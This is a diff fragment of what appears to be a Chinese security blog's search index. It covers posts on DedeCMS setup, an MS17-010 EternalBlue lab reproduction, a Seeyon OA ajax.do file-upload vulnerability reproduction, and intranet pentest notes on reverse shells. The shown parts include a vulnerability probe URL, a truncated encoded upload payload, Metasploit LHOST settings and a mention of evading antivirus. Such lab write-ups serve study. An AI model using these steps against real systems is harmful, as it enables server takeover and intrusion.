 <p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
+<a id="more"></a>
+
 <ol start="2">
 <li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
 <li>访问127.0.0.1的DedeCMS网址</li>
@@ -928,6 +944,8 @@ int main(int argc, char *argv[])
     <title>【MS17-010】永恒之蓝漏洞复现</title>
     <url>/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<a id="more"></a>
+
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
 <h3 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h3><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击机：kali-Linux-2019   192.168.141.133<br>靶机：Windows7 x64   192.168.141.136</p>
@@ -966,6 +984,8 @@ set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><spa
     <title>【致远OA】ajax.do任意文件上传漏洞复现</title>
     <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
+<a id="more"></a>
+
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1011,6 +1031,8 @@ managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00
     <url>/2021/10/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/</url>
     <content><![CDATA[<h3 id="0x00-本文顺序"><a href="#0x00-本文顺序" class="headerlink" title="0x00 本文顺序"></a>0x00 本文顺序</h3><p>内网架构及反弹shell-&gt;信息搜集1-&gt;本地提权-&gt;隧道搭建-&gt;信息搜集2</p>
 <p>提权与信息搜集是息息相关、相互嵌套的，你拿到怎样的权限才能获取相对应的信息，<strong>内网渗透就是不断获取信息的过程</strong>。在刚拿到内网机器时你的权限只允许你做简单的信息搜集，而之后需要根据之前搜集的内容进行提权，而要获取内网中其他主机的信息以及后续对于其他主机的渗透又需要隧道进行通信，所以在提权后进行隧道搭建，最后实施进一步的信息搜集。</p>
+<a id="more"></a>
+
 <h3 id="0x01-内网架构及反弹shell"><a href="#0x01-内网架构及反弹shell" class="headerlink" title="0x01 内网架构及反弹shell"></a>0x01 内网架构及反弹shell</h3><h4 id="Ⅰ-内网环境"><a href="#Ⅰ-内网环境" class="headerlink" title="Ⅰ 内网环境"></a>Ⅰ 内网环境</h4><p>用一张图来表示（其中域名为lce.com）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/1.png" alt="图片"><br>可以看到攻击机kali与内网win7可以通信，win7、server2012（域控）和xp在同一个域内（lce.com），其中win7与server2012在同一个局域网，而server2012与xp又在另一个局域网内。</p>
 <p>目前情况是我们已经拿到了win7的webshell，接下来我们需要通过kali拿到反弹shell，之后我们再横向拿下域控，再进一步拿下xp这台主机。</p>
 <h4 id="Ⅱ-msf反弹shell"><a href="#Ⅱ-msf反弹shell" class="headerlink" title="Ⅱ msf反弹shell"></a>Ⅱ msf反弹shell</h4><p><strong>为什么要反弹shell</strong><br>一般来说目标主机与我们攻击者之间都存在防火墙等安全设备，限制了流入目标主机的流量，导致我们直接连接目标主机会失败。所以我们想让目标主机主动连接我们，这就是反弹shell。<br><strong>如何反弹shell</strong><br>反弹shell的方法有很多，这里推荐使用msfconsole+msfvenom，如果需要免杀还可以生成指令配合混淆免杀，比如Backdoor-factory等等。</p>
